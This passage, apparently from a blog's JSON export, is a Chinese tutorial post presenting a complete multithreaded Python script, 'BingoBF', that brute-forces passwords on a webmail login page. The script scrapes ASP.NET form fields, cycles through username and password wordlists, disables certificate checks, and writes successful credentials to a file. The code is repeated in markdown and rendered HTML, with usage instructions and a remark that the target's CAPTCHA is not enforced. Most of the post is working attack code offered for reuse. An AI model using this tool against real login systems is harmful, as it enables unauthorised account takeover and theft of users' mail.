退两格，清空一格。 实现清空。\n                print(\"\\rTrying: %15s : %15s  (%d users left)\" % (username,password, self.user_q.qsize()),end=\"\")\n                #time.sleep(2)          # 调试时使用的\n                threadLock.release()    # 释放线程锁\n                reqResult = requests.post(target_url,data=post_tags,cookies=cookie,allow_redirects=True,proxies=proxies,verify=False)\n\n                if (\"欢迎使用XXX邮件系统\" in reqResult.text):   # 爆破成功\n                    threadLock.acquire()    # 取得线程锁\n                    print(\" \\b\\b\"*100,end=\"\")\n                    print (\"\\r[*] -->  %15s\\t%15s\" % (username,password))   # 打印到窗口\n                    #time.sleep(2)\n                    threadLock.release()    # 释放线程锁\n                    if self.outfilePath is not None:    # 输出到文件\n                        # 获取文件锁\n                        writeFileLock.acquire()\n                        try:\n                            # 追加到文件\n                            saveFile((username,password),self.outfilePath)\n                        finally:\n                            # 释放锁\n                            writeFileLock.release()\n                    break   # 跳出当前循环，进行下一个用户名爆破\n                if (\"您输入的验证码不正确，请重新输入!\" in reqResult.text): # 验证码错误，抛出异常！\n                    raise validcodeException(\"验证码错误，需要检查代码！！！！☆☆☆☆☆☆☆\")\n                    exit    # 退出！ 理论上不会执行这一句。\n                # 由于该登陆点存在验证码失效的问题，所以按理不会出现验证码不准确的情况，故而，也没继续完善代码。 如有需要，可自行完善。\n\n                if  (\"对不起, 您输入的用户名或口令错误, 请重新输入。\" in reqResult.text):\n                    pass        # 占一个坑，没鸟用\n                pass\n\n                #time.sleep(2)\n# 读取文件，生成队列\ndef build_list(listFile):   \n    # read in the list file\n    fd = open(listFile, \"rb\")\n    raw_words = fd.readlines()\n    fd.close()\n\n    words = queue.Queue()\n\n    for word in raw_words:\n        word = word.rstrip()\n        words.put(word)\n    return words\n\n\ndef main():\n    headCharPic=\"\\r        .--.\\n       |o_o |    ------------------ \\n       |:_/ |   < Author: Mr.Bingo >\\n      //   \\ \\   ------------------ \\n     (|     | ) <    oddboy.cn     >\\n    /'\\_   _/`\\  ------------------\\n    \\___)=(___/\\n\"\n    print(headCharPic)\n    # 创建一个argparser解析器\n    parser=argparse.ArgumentParser(\n        prog=\"BingoBF\",\n        usage=\" %(prog)s [options] \",\n        description='Brute Force 【https://mail.xxx.com] email\\'s passwords.',\n        epilog=\"+---+\\n\"\n        )\n\n    groupUser = parser.add_mutually_exclusive_group(required=True)\n    groupUser.add_argument('-u',dest=\"username\",help=\"username\")\n    groupUser.add_argument('-U',dest='userList',help=\"usernames\")\n\n    groupPwd = parser.add_mutually_exclusive_group(required=True)\n    groupPwd.add_argument('-p',dest=\"password\",help=\"password\")\n    groupPwd.add_argument('-P',dest='pwdList',help=\"passwords\")\n\n    parser.add_argument('-o',dest='output',help=\"print results to file\")\n\n    parser.add_argument(\"-t\",dest=\"thread\",type=int,help=\"mutli threads, default 3 threads\",default=3)\n\n    args=parser.parse_args()    # 命令行参数解析\n    \n    if args.username is not None:\n        userList=list(args.username)\n    else:\n        userList = build_list(args.userList)\n    if args.password is not None:\n        pwdList=list(args.password)\n    else:\n        pwdList = build_list(args.pwdList)\n\n    outfilePath = None\n    if args.output is not None:\n        outfilePath = args.output\n        filePath,fileName=os.path.split(outfilePath)\n        if (filePath!=\"\") and (not os.path.exists(filePath)):\n            os.mikedirs(filePath)   # 若不存在这个目录则递归创建\n\n    if args.thread is not None:\n        user_thread=args.thread\n\n    bruter_obj = Bruter(user_thread,userList,pwdList,outfilePath)\n    bruter_obj.run_bruteforce()\n\nif __name__ == '__main__':\n    main()\n```\n## 调用sample\n```\n➜ ~ python3 BingoBF.py -U user.txt -P pwd.txt -o Outfile.txt\n```\n\n## 附赠\n命令行中显示的企鹅字符画是用一个叫cowsay的工具弄的，感兴趣自己百谷。","slug":"多线程爆破脚本-python3","published":1,"updated":"2017-06-27T02:00:40.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cj9qrjfsr000p97uvqvt57czm","content":"<blockquote>\n<p>  起因，，，其实就是老板派的活，结合以前写过的脚本，略微完善了一下下，比较合适作为简单参考，找找代码感觉。本文也主要是解释说明代码。</p>\n</blockquote>\n<h2 id=\"主要功能\"><a href=\"#主要功能\" class=\"headerlink\" title=\"主要功能\"></a>主要功能</h2><p>脚本使用了命令行解析工具：argparser，所以直接-h查看帮助。 </p>\n<p>关于这个库的使用，可以参考我之前写过的blog：<a href=\"http://oddboy.cn/2017/06/Python-argparse模块详解/\">Python argparse模块详解</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div></pre></td><td class=\"code\"><pre><div class=\"line\">➜  pythonCode python3 BingoBF.py -h</div><div class=\"line\">        .--.</div><div class=\"line\">       |o_o |    ------------------</div><div class=\"line\">       |:_/ |   &lt; Author: Mr.Bingo &gt;</div><div class=\"line\">      //   \\ \\   ------------------</div><div class=\"line\">     (|     | ) &lt;    oddboy.cn     &gt;</div><div class=\"line\">    /&apos;\\_   _/`\\  ------------------</div><div class=\"line\">    \\___)=(___/</div><div class=\"line\"></div><div class=\"line\">usage: BingoBF [options]</div><div class=\"line\"></div><div class=\"line\">Brute Force 【https://mail.xxx.com] email&apos;s passwords.</div><div class=\"line\"></div><div class=\"line\">optional arguments:</div><div class=\"line\">  -h, --help   show this help message and exit</div><div class=\"line\">  -u USERNAME  username</div><div class=\"line\">  -U USERLIST  usernames</div><div class=\"line\">  -p PASSWORD  password</div><div class=\"line\">  -P PWDLIST   passwords</div><div class=\"line\">  -o OUTPUT    print results to file</div><div class=\"line\">  -t THREAD    mutli threads, default 3 threads</div><div class=\"line\"></div><div class=\"line\">+---+</div></pre></td></tr></table></figure>\n<a id=\"more\"></a>\n<h2 id=\"代码解释\"><a href=\"#代码解释\" class=\"headerlink\" title=\"代码解释\"></a>代码解释</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div><div class=\"line\">72</div><div class=\"line\">73</div><div class=\"line\">74</div><div class=\"line\">75</div><div class=\"line\">76</div><div class=\"line\">77</div><div class=\"line\">78</div><div class=\"line\">79</div><div class=\"line\">80</div><div class=\"line\">81</div><div class=\"line\">82</div><div class=\"line\">83</div><div class=\"line\">84</div><div class=\"line\">85</div><div class=\"line\">86</div><div class=\"line\">87</div><div class=\"line\">88</div><div class=\"line\">89</div><div class=\"line\">90</div><div class=\"line\">91</div><div class=\"line\">92</div><div class=\"line\">93</div><div class=\"line\">94</div><div class=\"line\">95</div><div class=\"line\">96</div><div class=\"line\">97</div><div class=\"line\">98</div><div class=\"line\">99</div><div class=\"line\">100</div><div class=\"line\">101</div><div class=\"line\">102</div><div class=\"line\">103</div><div class=\"line\">104</div><div class=\"line\">105</div><div class=\"line\">106</div><div class=\"line\">107</div><div class=\"line\">108</div><div class=\"line\">109</div><div class=\"line\">110</div><div class=\"line\">111</div><div class=\"line\">112</div><div class=\"line\">113</div><div class=\"line\">114</div><div class=\"line\">115</div><div class=\"line\">116</div><div class=\"line\">117</div><div class=\"line\">118</div><div class=\"line\">119</div><div class=\"line\">120</div><div class=\"line\">121</div><div class=\"line\">122</div><div class=\"line\">123</div><div class=\"line\">124</div><div class=\"line\">125</div><div class=\"line\">126</div><div class=\"line\">127</div><div class=\"line\">128</div><div class=\"line\">129</div><div class=\"line\">130</div><div class=\"line\">131</div><div class=\"line\">132</div><div class=\"line\">133</div><div class=\"line\">134</div><div class=\"line\">135</div><div class=\"line\">136</div><div class=\"line\">137</div><div class=\"line\">138</div><div class=\"line\">139</div><div class=\"line\">140</div><div class=\"line\">141</div><div class=\"line\">142</div><div class=\"line\">143</div><div class=\"line\">144</div><div class=\"line\">145</div><div class=\"line\">146</div><div class=\"line\">147</div><div class=\"line\">148</div><div class=\"line\">149</div><div class=\"line\">150</div><div class=\"line\">151</div><div class=\"line\">152</div><div class=\"line\">153</div><div class=\"line\">154</div><div class=\"line\">155</div><div class=\"line\">156</div><div class=\"line\">157</div><div class=\"line\">158</div><div class=\"line\">159</div><div class=\"line\">160</div><div class=\"line\">161</div><div class=\"line\">162</div><div class=\"line\">163</div><div class=\"line\">164</div><div class=\"line\">165</div><div class=\"line\">166</div><div class=\"line\">167</div><div class=\"line\">168</div><div class=\"line\">169</div><div class=\"line\">170</div><div class=\"line\">171</div><div class=\"line\">172</div><div class=\"line\">173</div><div class=\"line\">174</div><div class=\"line\">175</div><div class=\"line\">176</div><div class=\"line\">177</div><div class=\"line\">178</div><div class=\"line\">179</div><div class=\"line\">180</div><div class=\"line\">181</div><div class=\"line\">182</div><div class=\"line\">183</div><div class=\"line\">184</div><div class=\"line\">185</div><div class=\"line\">186</div><div class=\"line\">187</div><div class=\"line\">188</div><div class=\"line\">189</div><div class=\"line\">190</div><div class=\"line\">191</div><div class=\"line\">192</div><div class=\"line\">193</div><div class=\"line\">194</div><div class=\"line\">195</div><div class=\"line\">196</div><div class=\"line\">197</div><div class=\"line\">198</div><div class=\"line\">199</div><div class=\"line\">200</div><div class=\"line\">201</div></pre></td><td class=\"code\"><pre><div class=\"line\">#!/usr/bin/env python3</div><div class=\"line\"># -*- coding: utf-8 -*-</div><div class=\"line\"></div><div class=\"line\">import logging</div><div class=\"line\">import argparse</div><div class=\"line\">import queue</div><div class=\"line\">import requests</div><div class=\"line\">import threading</div><div class=\"line\">import os</div><div class=\"line\">import time</div><div class=\"line\">import random</div><div class=\"line\">from html.parser import HTMLParser</div><div class=\"line\">from requests.packages.urllib3.exceptions import InsecureRequestWarning</div><div class=\"line\"></div><div class=\"line\">requests.packages.urllib3.disable_warnings(InsecureRequestWarning)</div><div class=\"line\"># disable InsecureRequestWarning</div><div class=\"line\"># 由于目标站点使用的证书过期了，导致我在使用requests库请求时将verify设置为FALSE，同时配置了proxies(指向本地Burp)。而requests依赖的底层库urllib3总是报Warning，所以使用上面语句disable掉这个Warning。可以参考如下链接：</div><div class=\"line\"># https://stackoverflow.com/questions/27981545/suppress-insecurerequestwarning-unverified-https-request-is-being-made-in-pytho</div><div class=\"line\"></div><div class=\"line\">logging.basicConfig(level=logging.WARNING)       # 用logging,避免调试时满篇的print.（但本脚本中基本没怎么用。。。）</div><div class=\"line\"></div><div class=\"line\"># general settings</div><div class=\"line\"></div><div class=\"line\">target_url=&quot;https://mail.xxx.com/UserLogin.aspx&quot;</div><div class=\"line\"></div><div class=\"line\">writeFileLock = threading.Lock()    # 创建文件锁，避免写文件冲突。</div><div class=\"line\">threadLock = threading.Lock()    #创建线程锁，避免对显示效果的影响。</div><div class=\"line\"></div><div class=\"line\"># 保存爆破结果</div><div class=\"line\">def saveFile(message,outfilePath):</div><div class=\"line\">    with open(outfilePath, &apos;a+&apos;, encoding = &apos;utf8&apos;) as f:  # 以追加的方法结果写入文件</div><div class=\"line\">        f.write(message[0]+&quot;\\t&quot;)</div><div class=\"line\">        f.write(message[1]+&quot;\\n&quot;)</div><div class=\"line\"></div><div class=\"line\"># 自定义一个Exception类,用于显示自定义的异常。</div><div class=\"line\">class validcodeException(BaseException):</div><div class=\"line\">    def __init__(self,mesg=&quot; @@@@@@@@@@@@@@@         valid code is wrong!!!!!!!&quot;):</div><div class=\"line\">        print(mesg)</div><div class=\"line\"></div><div class=\"line\"># 解析响应报文，主要用户提取服务器响应回来的表单字段，顶好用的玩意儿。官方文档：https://docs.python.org/3.6/library/html.parser.html?highlight=htmlparser</div><div class=\"line\">class BruteParser(HTMLParser):</div><div class=\"line\">    def __init__(self):</div><div class=\"line\">        HTMLParser.__init__(self)</div><div class=\"line\">        self.tag_results = &#123;&#125;</div><div class=\"line\"></div><div class=\"line\">    def handle_starttag(self, tag, attrs):</div><div class=\"line\">        if tag == &quot;input&quot;:</div><div class=\"line\">            tag_name = None</div><div class=\"line\">            tag_value = None</div><div class=\"line\">            for name, value in attrs:</div><div class=\"line\">                if name == &quot;name&quot;:</div><div class=\"line\">                    tag_name = value</div><div class=\"line\">                if name == &quot;value&quot;:</div><div class=\"line\">                    tag_value = value</div><div class=\"line\">            if (tag_name == &quot;__VIEWSTATE&quot;) or (tag_name == &quot;__VIEWSTATEGENERATOR&quot;) or (tag_name == &quot;__EVENTVALIDATION&quot;):</div><div class=\"line\">                self.tag_results[tag_name] = tag_value</div><div class=\"line\"></div><div class=\"line\"># 核心实现类</div><div class=\"line\">class Bruter(object):</div><div class=\"line\">    def __init__(self, threads,userList,pwdList,outfilePath):</div><div class=\"line\">        self.user_q=userList</div><div class=\"line\">        self.pwdlist=list(pwdList.queue)      # 对于每个用户名，密码列表需要重复使用，所以不合适用队列，故而转换为list。</div><div class=\"line\">        self.threads=threads</div><div class=\"line\">        self.outfilePath=outfilePath</div><div class=\"line\">        print(&quot;Total %d(%d * %d) tries( %d threads)&quot;% (self.user_q.qsize()*len(self.pwdlist),self.user_q.qsize(),len(self.pwdlist),self.threads))</div><div class=\"line\"></div><div class=\"line\">    # 线程的创建与管理</div><div class=\"line\">    def run_bruteforce(self):</div><div class=\"line\">        thread_arr=[]       # 线程列表list</div><div class=\"line\">        for i in range(self.threads):</div><div class=\"line\">            t = threading.Thread(target=self.web_bruter)</div><div class=\"line\">            thread_arr.append(t)            # 创建线程</div><div class=\"line\">        for i in range(self.threads):</div><div class=\"line\">            thread_arr[i].start()           # 开启线程</div><div class=\"line\">        for i in range(self.threads):</div><div class=\"line\">            thread_arr[i].join()            # 回归线程</div><div class=\"line\"></div><div class=\"line\">    # 核心方法</div><div class=\"line\">    def web_bruter(self):</div><div class=\"line\">        proxies = &#123; </div><div class=\"line\">            &quot;http&quot;: &quot;http://127.0.0.1:8080&quot;, </div><div class=\"line\">            &quot;https&quot;: &quot;https://127.0.0.1:8080&quot;, </div><div class=\"line\">        &#125;       # Burpsuite的代理地址</div><div class=\"line\"></div><div class=\"line\">        # 初始化cookie以及hidden元素数据。</div><div class=\"line\">        response = requests.get(target_url,proxies=proxies,verify=False)</div><div class=\"line\">        cookie=response.cookies</div><div class=\"line\"></div><div class=\"line\">        # 解析异常表单字段</div><div class=\"line\">        parser = BruteParser()</div><div class=\"line\">        parser.feed(response.text)</div><div class=\"line\">        post_tags = parser.tag_results</div><div class=\"line\">        post_tags[&apos;cmdSubmit.x&apos;]=random.randint(1,47)       # 登录按钮图片 47x39像素</div><div class=\"line\">        post_tags[&apos;cmdSubmit.y&apos;]=random.randint(1,39)</div><div class=\"line\"></div><div class=\"line\">        # 从队列中取需要爆破的用户名，在多线程中使用queue比较方便。</div><div class=\"line\">        while not self.user_q.empty():</div><div class=\"line\">            username = self.user_q.get().rstrip().decode(&quot;ascii&quot;)</div><div class=\"line\">            for password in self.pwdlist:</div><div class=\"line\">                password=password.decode(&quot;ascii&quot;)</div><div class=\"line\">                post_tags[&quot;txtUsername&quot;]=username</div><div class=\"line\">                post_tags[&quot;txtPassword&quot;]=password</div><div class=\"line\">                </div><div class=\"line\">                threadLock.acquire()    # 取得线程锁，使用线程锁，避免出现显示效果被打乱的情况。</div><div class=\"line\">                # \\r将光标回退到行首（\\b回退一格）,实现原地覆盖。</div><div class=\"line\">                print(&quot; \\b\\b&quot;*100,end=&quot;&quot;)       # 退两格，清空一格。 实现清空。</div><div class=\"line\">                print(&quot;\\rTrying: %15s : %15s  (%d users left)&quot; % (username,password, self.user_q.qsize()),end=&quot;&quot;)</div><div class=\"line\">                #time.sleep(2)          # 调试时使用的</div><div class=\"line\">                threadLock.release()    # 释放线程锁</div><div class=\"line\">                reqResult = requests.post(target_url,data=post_tags,cookies=cookie,allow_redirects=True,proxies=proxies,verify=False)</div><div class=\"line\"></div><div class=\"line\">                if (&quot;欢迎使用XXX邮件系统&quot; in reqResult.text):   # 爆破成功</div><div class=\"line\">                    threadLock.acquire()    # 取得线程锁</div><div class=\"line\">                    print(&quot; \\b\\b&quot;*100,end=&quot;&quot;)</div><div class=\"line\">                    print (&quot;\\r[*] --&gt;  %15s\\t%15s&quot; % (username,password))   # 打印到窗口</div><div class=\"line\">                    #time.sleep(2)</div><div class=\"line\">                    threadLock.release()    # 释放线程锁</div><div class=\"line\">                    if self.outfilePath is not None:    # 输出到文件</div><div class=\"line\">                        # 获取文件锁</div><div class=\"line\">                        writeFileLock.acquire()</div><div class=\"line\">                        try:</div><div class=\"line\">                            # 追加到文件</div><div class=\"line\">                            saveFile((username,password),self.outfilePath)</div><div class=\"line\">                        finally:</div><div class=\"line\">                            # 释放锁</div><div class=\"line\">                            writeFileLock.release()</div><div class=\"line\">                    break   # 跳出当前循环，进行下一个用户名爆破</div><div class=\"line\">                if (&quot;您输入的验证码不正确，请重新输入!&quot; in reqResult.text): # 验证码错误，抛出异常！</div><div class=\"line\">                    raise validcodeException(&quot;验证码错误，需要检查代码！！！！☆☆☆☆☆☆☆&quot;)</div><div class=\"line\">                    exit    # 退出！ 理论上不会执行这一句。</div><div class=\"line\">                # 由于该登陆点存在验证码失效的问题，所以按理不会出现验证码不准确的情况，故而，也没继续完善代码。 如有需要，可自行完善。</div><div class=\"line\"></div><div class=\"line\">                if  (&quot;对不起, 您输入的用户名或口令错误, 请重新输入。&quot; in reqResult.text):</div><div class=\"line\">                    pass        # 占一个坑，没鸟用</div><div class=\"line\">                pass</div><div class=\"line\"></div><div class=\"line\">                #time.sleep(2)</div><div class=\"line\"># 读取文件，生成队列</div><div class=\"line\">def build_list(listFile):   </div><div class=\"line\">    # read in the list file</div><div class=\"line\">    fd = open(listFile, &quot;rb&quot;)</div><div class=\"line\">    raw_words = fd.readlines()</div><div class=\"line\">    fd.close()</div><div class=\"line\"></div><div class=\"line\">    words = queue.Queue()</div><div class=\"line\"></div><div class=\"line\">    for word in raw_words:</div><div class=\"line\">        word = word.rstrip()</div><div class=\"line\">        words.put(word)</div><div class=\"line\">    return words</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">def main():</div><div class=\"line\">    headCharPic=&quot;\\r        .--.\\n       |o_o |    ------------------ \\n       |:_/ |   &lt; Author: Mr.Bingo &gt;\\n      //   \\ \\   ------------------ \\n     (|     | ) &lt;    oddboy.cn     &gt;\\n    /&apos;\\_   _/`\\  ------------------\\n    \\___)=(___/\\n&quot;</div><div class=\"line\">    print(headCharPic)</div><div class=\"line\">    # 创建一个argparser解析器</div><div class=\"line\">    parser=argparse.ArgumentParser(</div><div class=\"line\">        prog=&quot;BingoBF&quot;,</div><div class=\"line\">        usage=&quot; %(prog)s [options] &quot;,</div><div class=\"line\">        description=&apos;Brute Force 【https://mail.xxx.com] email\\&apos;s passwords.&apos;,</div><div class=\"line\">        epilog=&quot;+---+\\n&quot;</div><div class=\"line\">        )</div><div class=\"line\"></div><div class=\"line\">    groupUser = parser.add_mutually_exclusive_group(required=True)</div><div class=\"line\">    groupUser.add_argument(&apos;-u&apos;,dest=&quot;username&quot;,help=&quot;username&quot;)</div><div class=\"line\">    groupUser.add_argument(&apos;-U&apos;,dest=&apos;userList&apos;,help=&quot;usernames&quot;)</div><div class=\"line\"></div><div class=\"line\">    groupPwd = parser.add_mutually_exclusive_group(required=True)</div><div class=\"line\">    groupPwd.add_argument(&apos;-p&apos;,dest=&quot;password&quot;,help=&quot;password&quot;)</div><div class=\"line\">    groupPwd.add_argument(&apos;-P&apos;,dest=&apos;pwdList&apos;,help=&quot;passwords&quot;)</div><div class=\"line\"></div><div class=\"line\">    parser.add_argument(&apos;-o&apos;,dest=&apos;output&apos;,help=&quot;print results to file&quot;)</div><div class=\"line\"></div><div class=\"line\">    parser.add_argument(&quot;-t&quot;,dest=&quot;thread&quot;,type=int,help=&quot;mutli threads, default 3 threads&quot;,default=3)</div><div class=\"line\"></div><div class=\"line\">    args=parser.parse_args()    # 命令行参数解析</div><div class=\"line\">    </div><div class=\"line\">    if args.username is not None:</div><div class=\"line\">        userList=list(args.username)</div><div class=\"line\">    else:</div><div class=\"line\">        userList = build_list(args.userList)</div><div class=\"line\">    if args.password is not None:</div><div class=\"line\">        pwdList=list(args.password)</div><div class=\"line\">    else:</div><div class=\"line\">        pwdList = build_list(args.pwdList)</div><div class=\"line\"></div><div class=\"line\">    outfilePath = None</div><div class=\"line\">    if args.output is not None:</div><div class=\"line\">        outfilePath = args.output</div><div class=\"line\">        filePath,fileName=os.path.split(outfilePath)</div><div class=\"line\">        if (filePath!=&quot;&quot;) and (not os.path.exists(filePath)):</div><div class=\"line\">            os.mikedirs(filePath)   # 若不存在这个目录则递归创建</div><div class=\"line\"></div><div class=\"line\">    if args.thread is not None:</div><div class=\"line\">        user_thread=args.thread</div><div class=\"line\"></div><div class=\"line\">    bruter_obj = Bruter(user_thread,userList,pwdList,outfilePath)</div><div class=\"line\">    bruter_obj.run_bruteforce()</div><div class=\"line\"></div><div class=\"line\">if __name__ == &apos;__main__&apos;:</div><div class=\"line\">    main()</div></pre></td></tr></table></figure>\n<h2 id=\"调用sample\"><a href=\"#调用sample\" class=\"headerlink\" title=\"调用sample\"></a>调用sample</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">➜ ~ python3 BingoBF.py -U user.txt -P pwd.txt -o Outfile.txt</div></pre></td></tr></table></figure>\n<h2 id=\"附赠\"><a href=\"#附赠\" class=\"headerlink\" title=\"附赠\"></a>附赠</h2><p>命令行中显示的企鹅字符画是用一个叫cowsay的工具弄的，感兴趣自己百谷。</p>\n","site":{"data":{}},"excerpt":"<blockquote>\n<p>  起因，，，其实就是老板派的活，结合以前写过的脚本，略微完善了一下下，比较合适作为简单参考，找找代码感觉。本文也主要是解释说明代码。</p>\n</blockquote>\n<h2 id=\"主要功能\"><a href=\"#主要功能\" class=\"headerlink\" title=\"主要功能\"></a>主要功能</h2><p>脚本使用了命令行解析工具：argparser，所以直接-h查看帮助。 </p>\n<p>关于这个库的使用，可以参考我之前写过的blog：<a href=\"http://oddboy.cn/2017/06/Python-argparse模块详解/\">Python argparse模块详解</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div></pre></td><td class=\"code\"><pre><div class=\"line\">➜  pythonCode python3 BingoBF.py -h</div><div class=\"line\">        .--.</div><div class=\"line\">       |o_o |    ------------------</div><div class=\"line\">       |:_/ |   &lt; Author: Mr.Bingo &gt;</div><div class=\"line\">      //   \\ \\   ------------------</div><div class=\"line\">     (|     | ) &lt;    oddboy.cn     &gt;</div><div class=\"line\">    /&apos;\\_   _/`\\  ------------------</div><div class=\"line\">    \\___)=(___/</div><div class=\"line\"></div><div class=\"line\">usage: BingoBF [options]</div><div class=\"line\"></div><div class=\"line\">Brute Force 【https://mail.xxx.com] email&apos;s passwords.</div><div class=\"line\"></div><div class=\"line\">optional arguments:</div><div class=\"line\">  -h, --help   show this help message and exit</div><div class=\"line\">  -u USERNAME  username</div><div class=\"line\">  -U USERLIST  usernames</div><div class=\"line\">  -p PASSWORD  password</div><div class=\"line\">  -P PWDLIST   passwords</div><div class=\"line\">  -o OUTPUT    print results to file</div><div class=\"line\">  -t THREAD    mutli threads, default 3 threads</div><div class=\"line\"></div><div class=\"line\">+---+</div></pre></td></tr></table></figure>","more":"<h2 id=\"代码解释\"><a href=\"#代码解释\" class=\"headerlink\" title=\"代码解释\"></a>代码解释</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div><div class=\"line\">72</div><div class=\"line\">73</div><div class=\"line\">74</div><div class=\"line\">75</div><div class=\"line\">76</div><div class=\"line\">77</div><div class=\"line\">78</div><div class=\"line\">79</div><div class=\"line\">80</div><div class=\"line\">81</div><div class=\"line\">82</div><div class=\"line\">83</div><div class=\"line\">84</div><div class=\"line\">85</div><div class=\"line\">86</div><div class=\"line\">87</div><div class=\"line\">88</div><div class=\"line\">89</div><div class=\"line\">90</div><div class=\"line\">91</div><div class=\"line\">92</div><div class=\"line\">93</div><div class=\"line\">94</div><div class=\"line\">95</div><div class=\"line\">96</div><div class=\"line\">97</div><div class=\"line\">98</div><div class=\"line\">99</div><div class=\"line\">100</div><div class=\"line\">101</div><div class=\"line\">102</div><div class=\"line\">103</div><div class=\"line\">104</div><div class=\"line\">105</div><div class=\"line\">106</div><div class=\"line\">107</div><div class=\"line\">108</div><div class=\"line\">109</div><div class=\"line\">110</div><div class=\"line\">111</div><div class=\"line\">112</div><div class=\"line\">113</div><div class=\"line\">114</div><div class=\"line\">115</div><div class=\"line\">116</div><div class=\"line\">117</div><div class=\"line\">118</div><div class=\"line\">119</div><div class=\"line\">120</div><div class=\"line\">121</div><div class=\"line\">122</div><div class=\"line\">123</div><div class=\"line\">124</div><div class=\"line\">125</div><div class=\"line\">126</div><div class=\"line\">127</div><div class=\"line\">128</div><div class=\"line\">129</div><div class=\"line\">130</div><div class=\"line\">131</div><div class=\"line\">132</div><div class=\"line\">133</div><div class=\"line\">134</div><div class=\"line\">135</div><div class=\"line\">136</div><div class=\"line\">137</div><div class=\"line\">138</div><div class=\"line\">139</div><div class=\"line\">140</div><div class=\"line\">141</div><div class=\"line\">142</div><div class=\"line\">143</div><div class=\"line\">144</div><div class=\"line\">145</div><div class=\"line\">146</div><div class=\"line\">147</div><div class=\"line\">148</div><div class=\"line\">149</div><div class=\"line\">150</div><div class=\"line\">151</div><div class=\"line\">152</div><div class=\"line\">153</div><div class=\"line\">154</div><div class=\"line\">155</div><div class=\"line\">156</div><div class=\"line\">157</div><div class=\"line\">158</div><div class=\"line\">159</div><div class=\"line\">160</div><div class=\"line\">161</div><div class=\"line\">162</div><div 